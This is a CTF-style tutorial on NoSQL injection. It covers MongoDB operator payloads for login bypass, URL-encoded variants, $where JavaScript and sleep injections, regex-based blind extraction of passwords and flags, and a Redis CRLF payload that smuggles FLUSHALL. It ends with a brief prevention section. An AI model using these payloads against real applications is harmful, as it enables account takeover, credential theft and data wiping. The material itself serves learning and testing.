# NoSQL Injection - Basics

## What is NoSQL Injection?

NoSQL Injection is a vulnerability where attackers manipulate NoSQL database queries by injecting malicious payloads. Unlike SQL injection, NoSQL databases use different query languages (often JSON-based), requiring different attack techniques.

**Key Impact**:
- Authentication bypass
- Data extraction
- Authorization bypass
- Denial of Service
- Remote Code Execution (in some cases)

---

## Common NoSQL Databases

### 1. **MongoDB** (Most common in CTFs)
- Document-oriented database
- Uses JSON-like queries (BSON)
- JavaScript-based query language

### 2. **CouchDB**
- Document-oriented
- RESTful HTTP API
- JavaScript views

### 3. **Redis**
- Key-value store
- In-memory database
- Simple command-based

### 4. **Cassandra**
- Wide-column store
- CQL (Cassandra Query Language)

### 5. **ElasticSearch**
- Search engine
- JSON-based queries

---

## MongoDB Injection (Most Common)

### How MongoDB Queries Work

#### Normal Query (Safe)
```javascript
// JavaScript/Node.js
db.users.find({ username: "admin", password: "password123" })
```

#### Vulnerable Code
```javascript
// Express.js example - VULNERABLE
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    
    // Directly using user input in query
    db.users.findOne({ 
        username: username, 
        password: password 
    }, (err, user) => {
        if (user) {
            res.send("Login successful");
        } else {
            res.send("Login failed");
        }
    });
});
```

---

## Basic MongoDB Injection Techniques

### 1. Authentication Bypass with Operators

#### The `$ne` (Not Equal) Operator

**Vulnerable Request:**
```json
POST /login
{
  "username": "admin",
  "password": "wrong_password"
}
```

**Injected Payload:**
```json
POST /login
{
  "username": "admin",
  "password": {"$ne": ""}
}
```

**Resulting MongoDB Query:**
```javascript
db.users.findOne({ 
    username: "admin", 
    password: { $ne: "" }  // password != "" (always true)
})
```

**Result**: Bypasses authentication! Finds user where password is NOT empty string.

---

#### The `$gt` (Greater Than) Operator

```json
POST /login
{
  "username": "admin",
  "password": {"$gt": ""}
}
```

**Resulting Query:**
```javascript
db.users.findOne({ 
    username: "admin", 
    password: { $gt: "" }  // password > "" (always true for any string)
})
```

---

#### Other Operators

**`$gte` (Greater Than or Equal):**
```json
{"password": {"$gte": ""}}
```

**`$lt` (Less Than):**
```json
{"password": {"$lt": "zzzzzz"}}
```

**`$exists` (Field Exists):**
```json
{"password": {"$exists": true}}
```

**`$regex` (Regular Expression):**
```json
{"password": {"$regex": ".*"}}
{"password": {"$regex": "^a"}}  // Password starts with 'a'
```

---

### 2. Bypassing Both Username and Password

```json
POST /login
{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

**Result**: Logs in as first user in database (often admin)!

---

### 3. Targeting Specific User

```json
POST /login
{
  "username": {"$in": ["admin", "administrator", "root"]},
  "password": {"$ne": ""}
}
```

**Result**: Tries to login as admin, administrator, or root.

---

## URL-Encoded Payloads (GET/POST)

### Query String Injection

**Normal Request:**
```
GET /login?username=admin&password=test123
```

**Injected (URL encoded):**
```
GET /login?username=admin&password[$ne]=
GET /login?username[$ne]=&password[$ne]=
GET /login?username=admin&password[$gt]=
GET /login?username=admin&password[$regex]=.*
```

**URL Encoding:**
```
[ = %5B
] = %5D
$ = %24

So: password[$ne]=
Becomes: password%5B%24ne%5D=
```

---

### POST Body Injection

#### JSON Format
```json
{
  "username": "admin",
  "password": {"$ne": ""}
}
```

#### URL-encoded Format
```
username=admin&password[$ne]=
username[$ne]=&password[$ne]=
```

---

## MongoDB Operator Reference

### Comparison Operators
```javascript
$eq  // Equal to
$ne  // Not equal to
$gt  // Greater than
$gte // Greater than or equal
$lt  // Less than
$lte // Less than or equal
$in  // In array
$nin // Not in array
```

### Logical Operators
```javascript
$and // Logical AND
$or  // Logical OR
$not // Logical NOT
$nor // Logical NOR
```

### Element Operators
```javascript
$exists // Field exists
$type   // Field type check
```

### Evaluation Operators
```javascript
$regex  // Regular expression
$where  // JavaScript expression (DANGEROUS!)
$expr   // Aggregation expression
```

---

## Advanced MongoDB Injection

### 1. Using `$where` for JavaScript Injection

#### Vulnerable Code
```javascript
db.users.find({ $where: `this.username == '${username}'` })
```

#### Injection Payload
```javascript
// Input: ' || 'a'=='a
// Resulting query:
$where: "this.username == '' || 'a'=='a'"  // Always true!
```

#### RCE via `$where` (Node.js)
```javascript
// If $where is injectable
' || this.password.match(/^a.*/) || '

// Sleep for time-based blind injection
' || sleep(5000) || '

// Extract data character by character
' || this.password[0] == 'a' || '
```

---

### 2. Blind NoSQL Injection with Regex

#### Concept
Extract data character by character using regex.

#### Extract Password Length
```javascript
// Test different lengths
{"username": "admin", "password": {"$regex": "^.{5}$"}}  // 5 chars
{"username": "admin", "password": {"$regex": "^.{6}$"}}  // 6 chars
{"username": "admin", "password": {"$regex": "^.{7}$"}}  // 7 chars
```

#### Extract Password Characters
```javascript
// First character
{"username": "admin", "password": {"$regex": "^a"}}  // Starts with 'a'
{"username": "admin", "password": {"$regex": "^b"}}  // Starts with 'b'

// Second character (if first is 'a')
{"username": "admin", "password": {"$regex": "^aa"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^ac"}}
```

---

### 3. Time-Based Blind Injection

#### Using `$where` with sleep
```javascript
{"username": "admin", "$where": "sleep(5000) || true"}
```

---

## Other NoSQL Databases

### CouchDB Injection

#### Vulnerable Query
```
GET /database/_find
{
  "selector": {
    "username": "admin",
    "password": "test"
  }
}
```

#### Injection
```json
{
  "selector": {
    "username": "admin",
    "password": {"$ne": ""}
  }
}
```

---

### Redis Injection

#### Vulnerable Code (PHP example)
```php
$redis->get($_GET['key']);
```

#### Command Injection
```
?key=test\r\nFLUSHALL\r\n
?key=test\r\nSET hacked "pwned"\r\n
```

---

### Cassandra (CQL Injection)

Similar to SQL injection:
```sql
-- Normal query
SELECT * FROM users WHERE username='admin' AND password='test';

-- Injection
username: admin' OR '1'='1
```

---

## Detection Methods

### 1. Test for NoSQL vs SQL
```
# Try SQL injection first
' OR 1=1--
' OR '1'='1

# If doesn't work, try NoSQL
{"$ne": ""}
[$ne]=
```

### 2. Check Response Differences
```
# Normal request
username=admin&password=test
Response: Login failed

# NoSQL injection
username=admin&password[$ne]=
Response: Login successful  ← Different!
```

### 3. Look for JSON in Requests
```
Content-Type: application/json

{
  "username": "test",
  "password": "test"
}
```
**Hint**: Likely using MongoDB or similar

---

## Exploitation Workflow

### Step 1: Identify NoSQL Database
- Check error messages
- Look for MongoDB, Redis, CouchDB mentions
- Test JSON payloads

### Step 2: Test Basic Injection
```json
{"$ne": ""}
```

### Step 3: Bypass Authentication
```json
{
  "username": "admin",
  "password": {"$ne": ""}
}
```

### Step 4: Extract Data (if needed)
Use regex-based blind injection:
```json
{"password": {"$regex": "^a"}}
{"password": {"$regex": "^ab"}}
{"password": {"$regex": "^abc"}}
```

---

## Common Vulnerable Patterns

### 1. Direct Object Assignment
```javascript
// VULNERABLE
const query = req.body;  // Direct assignment
db.users.findOne(query);
```

### 2. No Input Validation
```javascript
// VULNERABLE
db.users.findOne({ 
    username: req.body.username,  // No validation
    password: req.body.password 
});
```

### 3. String Concatenation in `$where`
```javascript
// VULNERABLE
db.users.find({ 
    $where: `this.username == '${username}'` 
});
```

---

## CTF-Specific Tips

### 1. Common Scenarios
- Login bypass
- Admin access
- Flag extraction from database
- User enumeration

### 2. Quick Tests
```json
# Try these first
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}
```

### 3. Look for Hints
- "MongoDB" in source code
- JSON-based login forms
- NoSQL database mentions

### 4. Extract Flags
```json
# If flag is in password field
{"username": "admin", "password": {"$regex": "^flag{"}}
{"username": "admin", "password": {"$regex": "^flag{a"}}
{"username": "admin", "password": {"$regex": "^flag{ab"}}
```

---

## Quick Reference

### Authentication Bypass
```json
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

### URL-Encoded
```
username=admin&password[$ne]=
username[$ne]=&password[$ne]=
```

### Regex Blind Injection
```json
{"password": {"$regex": "^a"}}
{"password": {"$regex": "^ab"}}
{"password": {"$regex": "^abc"}}
```

### Common Operators
```
$ne   - Not equal
$gt   - Greater than
$regex - Regular expression
$where - JavaScript expression
$exists - Field exists
```

---

## Tools

- **NoSQLMap**: Automated NoSQL injection tool
- **Burp Suite**: Manual testing
- **Custom scripts**: Python/JavaScript for automation

---

## Prevention (For Understanding)

### Secure Coding
```javascript
// Good - Validation
const username = req.body.username;
const password = req.body.password;

// Ensure they're strings
if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).send("Invalid input");
}

db.users.findOne({ username, password });
```

### Use Schema Validation
```javascript
const schema = {
    username: { type: String, required: true },
    password: { type: String, required: true }
};
```

---

## Next Steps

- **Advanced techniques**: Blind injection automation
- **Database-specific**: MongoDB, Redis, CouchDB deep dives
- **Exploitation chains**: NoSQL + XXE, NoSQL + SSRF

Remember: **NoSQL injection is different from SQL injection - look for JSON and operators!**